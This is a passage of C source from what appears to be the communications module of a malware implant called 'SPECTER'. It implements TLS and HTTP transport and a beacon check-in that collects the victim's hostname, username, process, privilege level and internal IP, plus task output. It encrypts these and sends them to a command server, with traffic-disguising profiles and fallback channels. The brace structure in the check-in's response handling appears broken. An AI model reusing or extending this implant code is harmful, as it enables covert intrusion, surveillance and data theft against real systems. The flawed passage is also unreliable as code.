    DWORD sent = 0;

    while (sent < len) {
        DWORD chunk = (len - sent > max_msg) ? max_msg : (len - sent);
        DWORD total = ctx->stream_sizes.cbHeader + chunk + ctx->stream_sizes.cbTrailer;

        /* Use send_buf if big enough, otherwise bail */
        if (total > COMMS_SEND_BUF_SIZE)
            return STATUS_BUFFER_TOO_SMALL;

        BYTE *msg_buf = ctx->send_buf;
        spec_memcpy(msg_buf + ctx->stream_sizes.cbHeader, data + sent, chunk);

        SecBuffer bufs[4];
        bufs[0].cbBuffer = ctx->stream_sizes.cbHeader;
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[0].pvBuffer = msg_buf;

        bufs[1].cbBuffer = chunk;
        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[1].pvBuffer = msg_buf + ctx->stream_sizes.cbHeader;

        bufs[2].cbBuffer = ctx->stream_sizes.cbTrailer;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[2].pvBuffer = msg_buf + ctx->stream_sizes.cbHeader + chunk;

        bufs[3].cbBuffer = 0;
        bufs[3].BufferType = SECBUFFER_EMPTY;
        bufs[3].pvBuffer = NULL;

        SecBufferDesc desc = { SECBUFFER_VERSION, 4, bufs };
        LONG ss = api->pEncryptMessage(&ctx->sec_context, 0, &desc, 0);
        if (ss != SEC_E_OK)
            return STATUS_UNSUCCESSFUL;

        /* Send all encrypted buffers */
        DWORD enc_len = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
        NTSTATUS ns = comms_tcp_send(ctx, msg_buf, enc_len);
        if (!NT_SUCCESS(ns))
            return ns;

        sent += chunk;
    }
    return STATUS_SUCCESS;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tls_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) {
    if (!ctx || !buf || buf_len == 0 || !received) return STATUS_INVALID_PARAMETER;
    if (!ctx->context_valid) return STATUS_INVALID_HANDLE;

    COMMS_API *api = &ctx->api;
    *received = 0;

    DWORD data_in = 0;

    /* Receive encrypted data */
    for (;;) {
        DWORD got = 0;
        if (data_in < COMMS_RECV_BUF_SIZE) {
            NTSTATUS ns = comms_tcp_recv(ctx, ctx->recv_buf + data_in,
                                          COMMS_RECV_BUF_SIZE - data_in, &got);
            if (!NT_SUCCESS(ns) && data_in == 0)
                return ns;
            data_in += got;
        }

        SecBuffer bufs[4];
        bufs[0].cbBuffer = data_in;
        bufs[0].BufferType = SECBUFFER_DATA;
        bufs[0].pvBuffer = ctx->recv_buf;
        bufs[1].cbBuffer = 0; bufs[1].BufferType = SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL;
        bufs[2].cbBuffer = 0; bufs[2].BufferType = SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL;
        bufs[3].cbBuffer = 0; bufs[3].BufferType = SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL;

        SecBufferDesc desc = { SECBUFFER_VERSION, 4, bufs };
        LONG ss = api->pDecryptMessage(&ctx->sec_context, &desc, 0, NULL);

        if (ss == SEC_E_INCOMPLETE_MESSAGE)
            continue;

        if (ss != SEC_E_OK && ss != SEC_I_RENEGOTIATE && ss != SEC_I_CONTEXT_EXPIRED)
            return STATUS_UNSUCCESSFUL;

        /* Find the data buffer */
        for (DWORD i = 0; i < 4; i++) {
            if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
                DWORD copy = bufs[i].cbBuffer;
                if (copy > buf_len) copy = buf_len;
                spec_memcpy(buf, bufs[i].pvBuffer, copy);
                *received = copy;
                break;
            }
        }

        /* Handle extra data */
        for (DWORD i = 0; i < 4; i++) {
            if (bufs[i].BufferType == SECBUFFER_EXTRA && bufs[i].cbBuffer > 0) {
                spec_memmove(ctx->recv_buf, bufs[i].pvBuffer, bufs[i].cbBuffer);
                data_in = bufs[i].cbBuffer;
                break;
            }
        }

        break;
    }

    return STATUS_SUCCESS;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    COMMS_API *api = &ctx->api;

    if (ctx->context_valid) {
        /* Send TLS shutdown */
        DWORD shutdown_token = 1; /* SCHANNEL_SHUTDOWN */
        SecBuffer shut_buf = { sizeof(shutdown_token), SECBUFFER_TOKEN, &shutdown_token };
        SecBufferDesc shut_desc = { SECBUFFER_VERSION, 1, &shut_buf };

        if (api->pApplyControlToken)
            api->pApplyControlToken(&ctx->sec_context, &shut_desc);

        /* Build close_notify */
        SecBuffer out_buf = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc out_desc = { SECBUFFER_VERSION, 1, &out_buf };
        ULONG attrs = 0;

        DWORD isc_flags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
                          ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY |
                          ISC_REQ_STREAM;

        (void)api->pInitializeSecurityContextA(
            &ctx->cred_handle, &ctx->sec_context, NULL, isc_flags,
            0, 0, NULL, 0, NULL, &out_desc, &attrs, NULL);

        if (out_buf.cbBuffer > 0 && out_buf.pvBuffer) {
            comms_tcp_send(ctx, (BYTE *)out_buf.pvBuffer, out_buf.cbBuffer);
            api->pFreeContextBuffer(out_buf.pvBuffer);
        }

        api->pDeleteSecurityContext(&ctx->sec_context);
        ctx->context_valid = FALSE;
    }

    api->pFreeCredentialsHandle(&ctx->cred_handle);
    return comms_tcp_close(ctx);
}

/* ------------------------------------------------------------------ */
/*  HTTP/1.1 request builder                                           */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
__attribute__((weak))
#endif
DWORD comms_http_build_request(DWORD method, const char *uri,
    const char *host, const char *headers, const BYTE *body,
    DWORD body_len, BYTE *output, DWORD output_len) {

    if (!uri || !host || !output || output_len == 0)
        return 0;

    DWORD pos = 0;

    /* Helper: append string */
    #define APPEND_STR(s) do { \
        const char *_s = (s); \
        DWORD _l = (DWORD)spec_strlen(_s); \
        if (pos + _l > output_len) return 0; \
        spec_memcpy(output + pos, _s, _l); \
        pos += _l; \
    } while (0)

    /* Request line */
    if (method == COMMS_HTTP_POST)
        APPEND_STR("POST ");
    else
        APPEND_STR("GET ");

    APPEND_STR(uri);
    APPEND_STR(" HTTP/1.1\r\n");

    /* Host header */
    APPEND_STR("Host: ");
    APPEND_STR(host);
    APPEND_STR("\r\n");

    /* Content-Length for POST */
    if (method == COMMS_HTTP_POST && body && body_len > 0) {
        char cl_val[12];
        uint_to_str(body_len, cl_val, sizeof(cl_val));
        APPEND_STR("Content-Length: ");
        APPEND_STR(cl_val);
        APPEND_STR("\r\n");
        APPEND_STR("Content-Type: application/octet-stream\r\n");
    }

    /* Connection keep-alive */
    APPEND_STR("Connection: keep-alive\r\n");

    /* Additional headers */
    if (headers && spec_strlen(headers) > 0) {
        APPEND_STR(headers);
        /* Ensure headers end with \r\n */
        if (pos >= 2 && (output[pos-2] != '\r' || output[pos-1] != '\n'))
            APPEND_STR("\r\n");
    }

    /* End of headers */
    APPEND_STR("\r\n");

    /* Body */
    if (method == COMMS_HTTP_POST && body && body_len > 0) {
        if (pos + body_len > output_len) return 0;
        spec_memcpy(output + pos, body, body_len);
        pos += body_len;
    }

    #undef APPEND_STR

    return pos;
}

/* ------------------------------------------------------------------ */
/*  HTTP/1.1 response parser                                           */
/* ------------------------------------------------------------------ */

/**
 * Find \r\n\r\n boundary between headers and body.
 * Returns offset of the first byte after \r\n\r\n, or 0 if not found.
 */
static DWORD find_header_end(const BYTE *data, DWORD len) {
    if (len < 4) return 0;
    for (DWORD i = 0; i <= len - 4; i++) {
        if (data[i] == '\r' && data[i+1] == '\n' &&
            data[i+2] == '\r' && data[i+3] == '\n')
            return i + 4;
    }
    return 0;
}

/**
 * Parse a 3-digit HTTP status code from the status line.
 */
static DWORD parse_status_code(const BYTE *data, DWORD len) {
    /* "HTTP/1.1 XXX ..." — status code starts at offset 9 */
    if (len < 12) return 0;

    /* Find the space after HTTP/1.x */
    DWORD i = 0;
    while (i < len && data[i] != ' ') i++;
    if (i >= len) return 0;
    i++; /* skip space */

    DWORD code = 0;
    for (int d = 0; d < 3 && i < len; d++, i++) {
        if (data[i] < '0' || data[i] > '9') return 0;
        code = code * 10 + (data[i] - '0');
    }
    return code;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_http_parse_response(const BYTE *data, DWORD data_len,
    DWORD *status_code_out, HTTP_HEADER *headers_out,
    DWORD *header_count_out, const BYTE **body_out, DWORD *body_len_out) {

    if (!data || data_len == 0 || !status_code_out)
        return STATUS_INVALID_PARAMETER;

    /* Find header/body boundary */
    DWORD header_end = find_header_end(data, data_len);
    if (header_end == 0) return STATUS_UNSUCCESSFUL;

    /* Parse status code */
    *status_code_out = parse_status_code(data, header_end);
    if (*status_code_out == 0) return STATUS_UNSUCCESSFUL;

    /* Parse headers */
    DWORD hdr_count = 0;

    /* Skip status line (find first \r\n) */
    DWORD line_start = 0;
    while (line_start < header_end && data[line_start] != '\r')
        line_start++;
    line_start += 2; /* skip \r\n */

    while (line_start < header_end - 2 && hdr_count < COMMS_MAX_HEADERS) {
        /* Check for end of headers */
        if (data[line_start] == '\r' && data[line_start + 1] == '\n')
            break;

        /* Find end of this line */
        DWORD line_end = line_start;
        while (line_end < header_end && data[line_end] != '\r')
            line_end++;

        /* Find colon separator */
        DWORD colon = line_start;
        while (colon < line_end && data[colon] != ':')
            colon++;

        if (colon < line_end && headers_out) {
            /* Copy header name */
            DWORD name_len = colon - line_start;
            if (name_len >= COMMS_MAX_HEADER_LEN)
                name_len = COMMS_MAX_HEADER_LEN - 1;
            spec_memcpy(headers_out[hdr_count].name, data + line_start, name_len);
            headers_out[hdr_count].name[name_len] = '\0';

            /* Skip colon and optional whitespace */
            DWORD val_start = colon + 1;
            while (val_start < line_end && data[val_start] == ' ')
                val_start++;

            /* Copy header value */
            DWORD val_len = line_end - val_start;
            if (val_len >= COMMS_MAX_HEADER_LEN)
                val_len = COMMS_MAX_HEADER_LEN - 1;
            spec_memcpy(headers_out[hdr_count].value, data + val_start, val_len);
            headers_out[hdr_count].value[val_len] = '\0';

            hdr_count++;
        }

        /* Advance to next line */
        line_start = line_end + 2; /* skip \r\n */
    }

    if (header_count_out)
        *header_count_out = hdr_count;

    /* Body */
    if (body_out)
        *body_out = data + header_end;
    if (body_len_out)
        *body_len_out = data_len - header_end;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Check-in payload builder                                           */
/* ------------------------------------------------------------------ */

/**
 * Build a TLV-encoded check-in payload with host information and task results.
 * Wire format: [1-byte version = 0x01][TLV fields...]
 * Each TLV: [2-byte LE tag][2-byte LE length][value bytes]
 * Returns total payload size, or 0 on error.
 */
static DWORD build_checkin_payload(IMPLANT_CONTEXT *impl_ctx, IMPLANT_CONFIG *cfg,
                                    DWORD seq, BYTE *out, DWORD out_len) {
    if (!cfg || !out || out_len < 64) return 0;

    g_tlv_buf_limit = out_len; /* enable bounds checking in tlv_put */
    DWORD pos = 0;

    /* Version byte */
    out[pos++] = CHECKIN_TLV_VERSION;

    /* Required fields */
    pos = tlv_put_u32(out, pos, TLV_SEQ_NUMBER, seq);
    pos = tlv_put(out, pos, TLV_IMPLANT_PUBKEY, cfg->implant_pubkey, 32);
    pos = tlv_put_u32(out, pos, TLV_CHECKIN_COUNT, cfg->checkin_count);

    /* Host info — hostname */
    char hostname[64];
    DWORD hlen = gather_hostname(hostname, sizeof(hostname));
    if (hlen > 0)
        pos = tlv_put_str(out, pos, TLV_HOSTNAME, hostname);

    /* Host info — username */
    char username[64];
    DWORD ulen = gather_username(username, sizeof(username));
    if (ulen > 0)
        pos = tlv_put_str(out, pos, TLV_USERNAME, username);

    /* Host info — PID */
    DWORD pid = gather_pid();
    pos = tlv_put_u32(out, pos, TLV_PID, pid);

    /* Host info — OS version */
    char os_ver[32];
    DWORD olen = gather_os_version(os_ver, sizeof(os_ver));
    if (olen > 0)
        pos = tlv_put_str(out, pos, TLV_OS_VERSION, os_ver);

    /* Host info — process name (from PEB InLoadOrderModuleList) */
    char proc_name[128];
    DWORD plen = gather_process_name(proc_name, sizeof(proc_name));
    if (plen > 0)
        pos = tlv_put_str(out, pos, TLV_PROCESS_NAME, proc_name);

    /* Host info — integrity level (via NtOpenProcessToken) */
    char integrity[16];
    DWORD ilen = gather_integrity_level(integrity, sizeof(integrity));
    if (ilen > 0)
        pos = tlv_put_str(out, pos, TLV_INTEGRITY, integrity);

    /* Host info — internal IP (via gethostname + gethostbyname) */
    char ip_buf[48];
    DWORD iplen = gather_internal_ip(ip_buf, sizeof(ip_buf));
    if (iplen > 0)
        pos = tlv_put_str(out, pos, TLV_INTERNAL_IP, ip_buf);

    /* Task results — include completed/failed task results from previous cycle.
     * Each result is serialized as a nested TLV block (TASK_RESULT).
     * Result data is capped at 0xFFF0 bytes to fit TLV u16 length field. */
    if (impl_ctx) {
        for (DWORD i = 0; i < impl_ctx->task_result_count; i++) {
            TASK_RESULT *r = &impl_ctx->task_results[i];

            /* Cap result data to fit in TLV u16 length, leaving room for
             * the nested TASK_ID + STATUS headers (~100 bytes overhead) */
            DWORD data_cap = r->data_len;
            if (data_cap > 0xFF00) data_cap = 0xFF00;

            /* Compute nested size: TASK_ID(4+id_len) + STATUS(4+8) + DATA(4+data_cap) */
            DWORD id_len = spec_strlen(r->task_id);
            DWORD nested_size = (4 + id_len) + (4 + 8) + (4 + data_cap);
            if (nested_size > 0xFFFF) nested_size = 0xFFFF;

            /* Check if there's room in the output buffer */
            if (pos + 4 + nested_size > out_len) break;

            /* Build nested TLV in-place: write TASK_RESULT header first
             * with placeholder length, then fill, then fix length */
            DWORD result_start = pos;
            /* Reserve 4 bytes for TASK_RESULT TLV header */
            pos += 4;

            /* RESULT_TASK_ID */
            pos = tlv_put_str(out, pos, TLV_RESULT_TASK_ID, r->task_id);

            /* RESULT_STATUS: "COMPLETE" or "FAILED" */
            {
                char s_complete[] = {'C','O','M','P','L','E','T','E',0};
                char s_failed[]   = {'F','A','I','L','E','D',0};
                const char *status_str = (r->status == 0) ? s_complete : s_failed;
                pos = tlv_put_str(out, pos, TLV_RESULT_STATUS, status_str);
            }

            /* RESULT_DATA */
            if (r->data && data_cap > 0) {
                pos = tlv_put(out, pos, TLV_RESULT_DATA, r->data, (WORD)data_cap);
            } else {
                pos = tlv_put(out, pos, TLV_RESULT_DATA, NULL, 0);
            }

            /* Patch the TASK_RESULT TLV header with actual nested length */
            DWORD nested_len = pos - result_start - 4;
            out[result_start]     = (BYTE)(TLV_TASK_RESULT & 0xFF);
            out[result_start + 1] = (BYTE)(TLV_TASK_RESULT >> 8);
            out[result_start + 2] = (BYTE)(nested_len & 0xFF);
            out[result_start + 3] = (BYTE)(nested_len >> 8);
        }
    }

    return pos;
}

/**
 * Generate a 12-byte nonce from sequence number + random padding.
 * First 4 bytes: LE sequence number.
 * Remaining 8 bytes: from system entropy or derived from pubkey + seq.
 */
static void generate_nonce(DWORD seq, const BYTE *pubkey, BYTE nonce[12]) {
    store32_le_comms(nonce, seq);
    /* Derive remaining 8 bytes: SHA-256(pubkey || seq)[0..8] */
    BYTE hash_input[36];
    spec_memcpy(hash_input, pubkey, 32);
    store32_le_comms(hash_input + 32, seq);

    BYTE digest[SHA256_DIGEST_SIZE];
    spec_sha256(hash_input, 36, digest);
    spec_memcpy(nonce + 4, digest, 8);
    spec_memset(digest, 0, sizeof(digest));
    spec_memset(hash_input, 0, sizeof(hash_input));
}

/* ------------------------------------------------------------------ */
/*  Check-in protocol                                                  */
/* ------------------------------------------------------------------ */

/**
 * Profile-driven check-in: builds payload → transform_send → profile_embed_data
 * → profile_build_headers → profile_get_uri → send → parse → profile_extract_data
 * → transform_recv → extract tasks.
 *
 * Falls back to legacy wire format when no profile is attached.
 */
#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
    COMMS_TRACE("[SPECTER] checkin: enter");
    if (!ctx || !ctx->config || !ctx->comms_ctx)
        return STATUS_INVALID_PARAMETER;

    /* All heap-trackable pointers — no large stack buffers anywhere.
       Total stack footprint of this function: ~200 bytes (pointers + scalars). */
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    BYTE *payload      = NULL;
    BYTE *http_buf     = NULL;
    BYTE *wire_buf     = NULL;
    BYTE *ciphertext   = NULL;
    BYTE *transformed  = NULL;
    BYTE *resp_buf     = NULL;
    BYTE *body_heap    = NULL;   /* heap copy of profile body */
    BYTE *headers_heap = NULL;   /* heap copy of profile headers */
    BYTE *extracted    = NULL;   /* profile extract buffer */
    BYTE *resp_plain   = NULL;   /* decrypted response buffer */
    DWORD payload_buf_size = 0;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) { status = STATUS_UNSUCCESSFUL; goto cleanup; }

    CHANNEL_CONFIG *ch = &cfg->channels[comms->active_channel];

    /* Reconnect TCP for each checkin (HTTP/1.0 — server closes after response) */
    if (comms->state != COMMS_STATE_DISCONNECTED) {
        if (ch->needs_tls && comms->api.tls_available)
            comms_tls_close(comms);
        else
            comms_tcp_close(comms);
    }

    COMMS_TRACE("[SPECTER] checkin: tcp_connect...");
    status = comms_tcp_connect(comms, ch->url, ch->port);
    if (!NT_SUCCESS(status)) goto cleanup;

    if (ch->needs_tls && comms->api.tls_available) {
        status = comms_tls_handshake(comms, ch->url);
        if (!NT_SUCCESS(status)) {
            comms_tcp_close(comms);
            goto cleanup;
        }
    }
    COMMS_TRACE("[SPECTER] checkin: connected");

    /* ---- Build plaintext TLV payload (heap) ---- */
    COMMS_TRACE("[SPECTER] checkin: build_payload...");
    payload_buf_size = 1024;
    if (ctx->task_result_count > 0) {
        DWORD needed = 512;
        for (DWORD ri = 0; ri < ctx->task_result_count; ri++) {
            needed += 128 + ctx->task_results[ri].data_len;
        }
        if (needed > payload_buf_size) payload_buf_size = needed;
        if (payload_buf_size > 0xFFFF) payload_buf_size = 0xFFFF;
    }
    payload = (BYTE *)heap_alloc_cached(payload_buf_size);
    if (!payload) { status = STATUS_NO_MEMORY; goto cleanup; }

    DWORD payload_len = build_checkin_payload(ctx, cfg, comms->msg_seq, payload, payload_buf_size);
    if (payload_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
    COMMS_TRACE("[SPECTER] checkin: payload built OK");

    /* ---- HTTP buffer (heap) ---- */
    DWORD wire_overhead = 300 + 4 + 24 + 16;
    DWORD http_buf_size = payload_len + wire_overhead + 512;
    if (http_buf_size < 4096) http_buf_size = 4096;

    http_buf = (BYTE *)heap_alloc_cached(http_buf_size);
    if (!http_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
    DWORD http_len = 0;

    if (comms->profile && comms->profile->initialized) {
        /* ============== Profile-driven path ============== */
        PROFILE_CONFIG *prof = comms->profile;

        /* Step 1: transform_send (heap buffer) */
        DWORD transform_buf_size = payload_len + 4096;
        if (transform_buf_size < TRANSFORM_MAX_OUTPUT)
            transform_buf_size = TRANSFORM_MAX_OUTPUT;
        transformed = (BYTE *)heap_alloc_cached(transform_buf_size);
        if (!transformed) { status = STATUS_NO_MEMORY; goto cleanup; }

        DWORD transformed_len = 0;
        status = transform_send(payload, payload_len, comms->session_key,
                                 &prof->transform, transformed, &transformed_len,
                                 transform_buf_size);
        spec_memset(payload, 0, payload_buf_size);
        if (!NT_SUCCESS(status)) goto cleanup;

        /* Step 2: profile_embed_data (heap buffer) */
        DWORD body_heap_size = 4096;
        body_heap = (BYTE *)heap_alloc_cached(body_heap_size);
        if (!body_heap) { status = STATUS_NO_MEMORY; goto cleanup; }

        DWORD embed_body_len = profile_embed_data(prof, transformed, transformed_len,
                                                   body_heap, body_heap_size);
        if (embed_body_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }

        /* Step 3: profile_build_headers (heap buffer) */
        DWORD headers_heap_size = 2048;
        headers_heap = (BYTE *)heap_alloc_cached(headers_heap_size);
        if (!headers_heap) { status = STATUS_NO_MEMORY; goto cleanup; }

        DWORD headers_len = profile_build_headers(prof, (char *)headers_heap, headers_heap_size);
        (void)headers_len;

        /* Step 4: profile_get_uri */
        const char *uri = profile_get_uri(prof);

        /* Step 5: Build HTTP request */
        DWORD method = profile_get_method(prof);
        http_len = comms_http_build_request(
            method, uri, ch->url,
            ((char *)headers_heap)[0] ? (char *)headers_heap : NULL,
            body_heap, embed_body_len, http_buf, http_buf_size);

        /* Free profile temporaries early */
        heap_free_cached(body_heap);    body_heap = NULL;
        heap_free_cached(headers_heap); headers_heap = NULL;
        heap_free_cached(transformed);  transformed = NULL;

        if (http_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }

    } else {
        /* ============== Legacy wire format path ============== */
        COMMS_TRACE("[SPECTER] checkin: legacy wire path");
        spec_memset(payload, 0, payload_buf_size);
        payload_len = build_checkin_payload(ctx, cfg, comms->msg_seq, payload, payload_buf_size);

        BYTE nonce[AEAD_NONCE_SIZE];
        generate_nonce(comms->msg_seq, cfg->implant_pubkey, nonce);

        /* Ciphertext buffer (heap) */
        ciphertext = (BYTE *)heap_alloc_cached(payload_len > 64 ? payload_len : 64);
        if (!ciphertext) { status = STATUS_NO_MEMORY; goto cleanup; }

        BYTE tag[AEAD_TAG_SIZE];
        spec_aead_encrypt(comms->session_key, nonce, payload, payload_len,
                           NULL, 0, ciphertext, tag);
        spec_memset(payload, 0, payload_buf_size);

        DWORD wire_body_len = COMMS_WIRE_HEADER_SIZE + payload_len + COMMS_WIRE_TAG_SIZE;
        DWORD wire_total = COMMS_WIRE_LEN_SIZE + wire_body_len;

        /* Wire buffer (heap) */
        wire_buf = (BYTE *)heap_alloc_cached(wire_total);
        if (!wire_buf) { status = STATUS_NO_MEMORY; goto cleanup; }

        DWORD wp = 0;
        store32_le_comms(wire_buf + wp, wire_body_len); wp += 4;
        spec_memcpy(wire_buf + wp, cfg->implant_pubkey, COMMS_WIRE_IMPLANT_ID); wp += COMMS_WIRE_IMPLANT_ID;
        spec_memcpy(wire_buf + wp, nonce, AEAD_NONCE_SIZE); wp += AEAD_NONCE_SIZE;
        spec_memcpy(wire_buf + wp, ciphertext, payload_len); wp += payload_len;
        spec_memcpy(wire_buf + wp, tag, AEAD_TAG_SIZE); wp += AEAD_TAG_SIZE;

        COMMS_TRACE("[SPECTER] checkin: building HTTP request");
        const char *req_uri = ch->uri[0] ? ch->uri : "/api/beacon";
        http_len = comms_http_build_request(
            COMMS_HTTP_POST, req_uri, ch->url, NULL,
            wire_buf, wire_total, http_buf, http_buf_size);

        /* Free wire + ciphertext early */
        heap_free_cached(wire_buf);    wire_buf = NULL;
        heap_free_cached(ciphertext);  ciphertext = NULL;
        spec_memset(nonce, 0, sizeof(nonce));

        if (http_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
        COMMS_TRACE("[SPECTER] checkin: HTTP request built, sending...");
    }

    /* Free payload before network I/O */
    heap_free_cached(payload); payload = NULL;

    /* ---- Send request ---- */
    if (comms->state == COMMS_STATE_TLS_CONNECTED)
        status = comms_tls_send(comms, http_buf, http_len);
    else
        status = comms_tcp_send(comms, http_buf, http_len);
    if (!NT_SUCCESS(status)) goto cleanup;
    COMMS_TRACE("[SPECTER] checkin: sent, receiving response...");

    /* ---- Receive response (heap buffer) ---- */
    resp_buf = (BYTE *)heap_alloc_cached(COMMS_RECV_BUF_SIZE);
    if (!resp_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
    DWORD resp_total = 0;

    for (int attempts = 0; attempts < 10; attempts++) {
        DWORD got = 0;
        if (comms->state == COMMS_STATE_TLS_CONNECTED)
            status = comms_tls_recv(comms, resp_buf + resp_total,
                                     (DWORD)(COMMS_RECV_BUF_SIZE - resp_total), &got);
        else
            status = comms_tcp_recv(comms, resp_buf + resp_total,
                                     (DWORD)(COMMS_RECV_BUF_SIZE - resp_total), &got);
        if (!NT_SUCCESS(status)) goto cleanup;
        resp_total += got;

        if (find_header_end(resp_buf, resp_total) > 0)
            break;
    }

    /* ---- Parse HTTP response ---- */
    COMMS_TRACE("[SPECTER] checkin: parsing HTTP response...");
    DWORD http_status = 0;
    const BYTE *body = NULL;
    DWORD body_len = 0;
    status = comms_http_parse_response(resp_buf, resp_total, &http_status,
                                        NULL, NULL, &body, &body_len);
    if (!NT_SUCCESS(status)) goto cleanup;
    COMMS_TRACE("[SPECTER] checkin: HTTP response parsed");
    if (http_status != 200) { status = STATUS_UNSUCCESSFUL; goto cleanup; }

    /* ---- Process response body ---- */
    if (body && body_len > 0) {
        if (comms->profile && comms->profile->initialized) {
            /* Profile-driven: extract -> transform_recv (all heap) */
            extracted = (BYTE *)heap_alloc_cached(4096);
            if (extracted) {
                DWORD extracted_len = 0;
                DWORD extract_ret = profile_extract_data(comms->profile, body, body_len,
                                                          extracted, &extracted_len);
                if (extract_ret > 0 && extracted_len > 0) {
                    resp_plain = (BYTE *)heap_alloc_cached(4096);
                    if (resp_plain) {
                        DWORD resp_plain_len = 0;
                        status = transform_recv(extracted, extracted_len,
                                                 comms->session_key,
                                                 &comms->profile->transform,
                                                 resp_plain, &resp_plain_len,
                                                 4096);
                        if (NT_SUCCESS(status) && resp_plain_len > 0) {
                            parse_checkin_response(ctx, comms, resp_plain, resp_plain_len);
                        }
                        spec_memset(resp_plain, 0, 4096);
                    }
                }
        } else if (body_len > COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE + COMMS_WIRE_TAG_SIZE) {
            /* Legacy wire format:
               [4-byte LE len][12-byte server_id][12-byte nonce][ciphertext][16-byte tag] */
            DWORD resp_wire_len = load32_le_comms(body);
            const BYTE *resp_nonce = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_IMPLANT_ID;
            DWORD resp_ct_len = resp_wire_len - COMMS_WIRE_HEADER_SIZE - COMMS_WIRE_TAG_SIZE;
            const BYTE *resp_ct = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE;
            const BYTE *resp_tag = resp_ct + resp_ct_len;

            if (resp_ct_len <= 512) {
                resp_plain = (BYTE *)heap_alloc_cached(512);
                if (resp_plain) {
                    BOOL ok = spec_aead_decrypt(comms->session_key, resp_nonce,
                                                 resp_ct, resp_ct_len, NULL, 0,
                                                 resp_plain, resp_tag);
                    if (ok) {
                        parse_checkin_response(ctx, comms, resp_plain, resp_ct_len);
                    }
                    spec_memset(resp_plain, 0, 512);
                }
            }
        }
    }

    status = STATUS_SUCCESS;

cleanup:
    /* Free all heap-allocated buffers (heap_free_cached is a no-op on NULL) */
    if (payload) { spec_memset(payload, 0, payload_buf_size); heap_free_cached(payload); }
    heap_free_cached(http_buf);
    heap_free_cached(wire_buf);
    heap_free_cached(ciphertext);
    heap_free_cached(transformed);
    heap_free_cached(resp_buf);
    heap_free_cached(body_heap);
    heap_free_cached(headers_heap);
    heap_free_cached(extracted);
    heap_free_cached(resp_plain);

    /* Only clear results and bump counters on success */
    if (NT_SUCCESS(status)) {
        task_free_results(ctx);
        comms->msg_seq++;
        cfg->checkin_count++;
        COMMS_TRACE("[SPECTER] checkin: complete");
    }

    return status;
}

/* ------------------------------------------------------------------ */
/*  comms_set_profile                                                  */
/* ------------------------------------------------------------------ */

PROFILE_CONFIG *comms_get_profile_ptr(PVOID comms_ctx) {
    if (!comms_ctx) return NULL;
    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)comms_ctx;
    return comms->profile;
}

NTSTATUS comms_set_profile(IMPLANT_CONTEXT *ctx, PROFILE_CONFIG *profile) {
    if (!ctx || !ctx->comms_ctx)
        return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    comms->profile = profile;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Channel rotation                                                   */
/* ------------------------------------------------------------------ */

NTSTATUS comms_rotate_channel(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->comms_ctx || !ctx->config)
        return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    /* Close existing connection */
    if (comms->state >= COMMS_STATE_TLS_CONNECTED)
        comms_tls_close(comms);
    else if (comms->state >= COMMS_STATE_TCP_CONNECTED)
        comms_tcp_close(comms);

    /* Find next active channel with higher priority number */
    DWORD current_priority = cfg->channels[comms->active_channel].priority;
    DWORD best_idx = (DWORD)-1;
    DWORD best_priority = (DWORD)-1;

    /* First pass: find next higher priority channel */
    for (DWORD i = 0; i < cfg->channel_count; i++) {
        if (i == comms->active_channel) continue;
        if (!cfg->channels[i].active) continue;
        if (cfg->channels[i].priority > current_priority &&
            cfg->channels[i].priority < best_priority) {
            best_idx = i;
            best_priority = cfg->channels[i].priority;
        }
    }

    /* Wrap around: if no higher priority, pick lowest priority */
    if (best_idx == (DWORD)-1) {
        for (DWORD i = 0; i < cfg->channel_count; i++) {
            if (i == comms->active_channel) continue;
            if (!cfg->channels[i].active) continue;
            if (cfg->channels[i].priority < best_priority) {
                best_idx = i;
                best_priority = cfg->channels[i].priority;
            }
        }
    }

    if (best_idx == (DWORD)-1)
        return STATUS_UNSUCCESSFUL; /* No alternative channels */

    comms->active_channel = best_idx;

    /* Connect to new channel */
    CHANNEL_CONFIG *ch = &cfg->channels[best_idx];
    NTSTATUS status = comms_tcp_connect(comms, ch->url, ch->port);
